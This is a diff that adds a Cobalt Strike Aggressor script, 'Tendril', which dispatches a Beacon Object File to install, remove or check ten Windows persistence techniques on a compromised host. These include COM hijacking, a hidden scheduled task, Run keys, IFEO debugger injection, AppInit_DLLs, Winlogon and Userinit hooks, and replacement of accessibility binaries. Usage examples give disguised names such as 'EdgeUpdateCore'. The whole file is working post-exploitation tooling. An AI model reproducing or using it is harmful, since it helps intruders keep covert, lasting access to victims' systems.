@@ -1,0 +1,96 @@
+# Tendril - Cobalt Strike Aggressor Script
+# Single BOF, module dispatch via ID
+#
+# Module IDs:
+#   0=com_hijack  1=ghost_task  2=registry_run  3=screensaver
+#   4=ifeo_inject  5=appinit_dlls  6=winlogon_helper  7=accessibility
+#   8=netsh_helper  9=userinit_mpr
+#
+# Action IDs: 0=install  1=remove  2=check
+
+sub _bof {
+    local('$bof $arch');
+    $arch = barch($1);
+    $bof = script_resource("../bof/build/tendril. $+ $arch $+ .o");
+    return readb(openf($bof), -1);
+}
+
+# ---- Unified command ----
+# tendril <module> <action> [arg1] [arg2] [arg3]
+alias tendril {
+    local('%mods $mid $aid $a1 $a2 $a3');
+
+    %mods["com_hijack"]      = 0;
+    %mods["ghost_task"]      = 1;
+    %mods["registry_run"]    = 2;
+    %mods["screensaver"]     = 3;
+    %mods["ifeo_inject"]     = 4;
+    %mods["appinit_dlls"]    = 5;
+    %mods["winlogon_helper"] = 6;
+    %mods["accessibility"]   = 7;
+    %mods["netsh_helper"]    = 8;
+    %mods["userinit_mpr"]    = 9;
+
+    if ($2 is $null || $3 is $null) {
+        berror($1, "Usage: tendril <module> <install|remove|check> [arg1] [arg2] [arg3]");
+        berror($1, "Modules: com_hijack ghost_task registry_run screensaver ifeo_inject");
+        berror($1, "         appinit_dlls winlogon_helper accessibility netsh_helper userinit_mpr");
+        return;
+    }
+
+    $mid = %mods[$2];
+    if ($mid is $null) {
+        berror($1, "Unknown module: $2");
+        return;
+    }
+
+    if ($3 eq "install")    { $aid = 0; }
+    else if ($3 eq "remove") { $aid = 1; }
+    else if ($3 eq "check")  { $aid = 2; }
+    else { berror($1, "Unknown action: $3 (use install/remove/check)"); return; }
+
+    $a1 = iff($4, $4, "");
+    $a2 = iff($5, $5, "");
+    $a3 = iff($6, $6, "");
+
+    $args = bof_pack($1, "ssZZZ", $mid, $aid, $a1, $a2, $a3);
+    beacon_inline_execute($1, _bof($1), "go", $args);
+}
+
+# ---- Convenience aliases ----
+alias tendril-help {
+    blog($1, "
+Tendril Persistence BOF - single dispatch
+
+  tendril <module> <action> [arg1] [arg2] [arg3]
+
+Modules & arguments:
+  com_hijack      install <dll_path> <CLSID> [ThreadingModel]
+  com_hijack      remove  \"\" <CLSID>
+  ghost_task      install <task_name>
+  ghost_task      check
+  registry_run    install <payload> <value_name> [HKCU|HKLM]
+  registry_run    remove  \"\" <value_name> [HKCU|HKLM]
+  screensaver     install <scr_path> [timeout_secs]
+  screensaver     remove
+  ifeo_inject     install <payload> <target.exe> [debugger|silent]
+  ifeo_inject     remove  \"\" <target.exe> [debugger|silent]
+  appinit_dlls    install <dll_path> [x64|x86]
+  appinit_dlls    remove
+  winlogon_helper install <payload> <Shell|Taskman> [HKCU|HKLM]
+  winlogon_helper remove  \"\" <Shell|Taskman> [HKCU|HKLM]
+  accessibility   install <payload> <sethc.exe|utilman.exe|osk.exe>
+  accessibility   remove  \"\" <sethc.exe|utilman.exe>
+  netsh_helper    install <dll_path> <value_name>
+  netsh_helper    remove  \"\" <value_name>
+  userinit_mpr    install <payload>
+  userinit_mpr    remove
+
+Examples:
+  tendril com_hijack install C:\\proxy.dll {BCDE0395-E52F-467C-8E3D-C4579291692E}
+  tendril ghost_task install EdgeUpdateCore
+  tendril ghost_task check
+  tendril ifeo_inject install C:\\x.exe notepad.exe silent
+  tendril screensaver install C:\\p.scr 300
+");
+}
